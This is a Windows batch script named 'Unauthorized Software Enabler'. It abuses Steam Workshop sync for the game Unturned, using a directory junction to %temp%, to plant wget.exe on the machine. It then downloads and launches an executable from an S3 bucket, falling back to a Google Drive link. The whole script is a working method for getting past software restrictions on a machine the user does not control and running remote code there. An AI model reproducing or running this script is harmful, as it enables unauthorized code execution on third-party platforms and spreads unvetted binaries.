@echo off
title Prepare Unauthorized Software Enabler - (C) 2020 SoftwareRat
%HOMEDRIVE%
CD "%PROGRAMFILES(X86)%\Steam"
%HOMEDRIVE%
echo Please add https://steamcommunity.com/sharedfiles/filedetails/?id=2221493609
cd %PROGRAMFILES(X86)%\Steam"
cd "C:\Program Files (x86)\Steam\steamapps\workshop\"
md "content\304930\2221493609\files\" >NUL 2>&1
mklink /J "content\304930\2221493609\files\HERE\" "%temp%" >NUL 2>&1
:: Open Unturned 
:LaunchUnturned:
start "" "steam://rungameid/304930/"
tasklist /nh /fi "imagename eq Unturned.exe" | find /i "Unturned.exe" >nul && (
:: If Unturned running
timeout /t 10 >nul
taskkill /f /im Unturned*
GOTO AfterUnturned
) || (
:: If Unturned not running
GOTO LaunchUnturned
)
:AfterUnturned:
:: Checking if WGET for Windows exists
:CHECKLOOP
IF EXIST "%temp%\wget.exe" GOTO FOUND >NUL 2>&1
GOTO NOTFOUND
:NOTFOUND
GOTO CHECKLOOP
:FOUND
cls
echo Downloading Unauthorized Software Enabler...
echo Unauthorized Software Enabler is and will be always free.
echo If you paid for this software, you got scammed and the money only supports the scammer!
%HOMEDRIVE%
cd \
md USEtemp
cd "%PROGRAMFILES(X86)%\Steam\"
timeout /T 3 >NUL
GOTO USEdownload
:notsuccessfull:
echo USE was not downloaded successfully. Retrying download and execution....
:USEdownload:
"%temp%\wget.exe" -O "%temp%\USE-CSharp-Edition.exe" -q "https://usecsharpedition.s3.eu-central-1.amazonaws.com/Steam/USE-CSharp-Edition.exe" >NUL
:: Checking if download is successfull
if "%errorlevel%"=="0" GOTO AWSserver
if not "%errorlevel%"=="0" GOTO gDriveServer
:AWSserver:
:: If AWS Server is online, this code will be executed
cls
start "" "%temp%\USE-CSharp-Edition.exe" || GOTO notsuccessfull
exit
:gDriveServer;
:: If AWS Server is offline, this code will be executed
copy /y NUL "%temp%\BackupNeeded.ini" >NUL
"%temp%\wget.exe" -O "%temp%\USE-CSharp-Edition.exe" -q "https://drive.google.com/uc?export=download&id=12W-0z-YsZA9iX81zikuYhWig9fE5H6Qt"
cls
start "" "%temp%\USE-CSharp-Edition.exe" || GOTO notsuccessfull
exit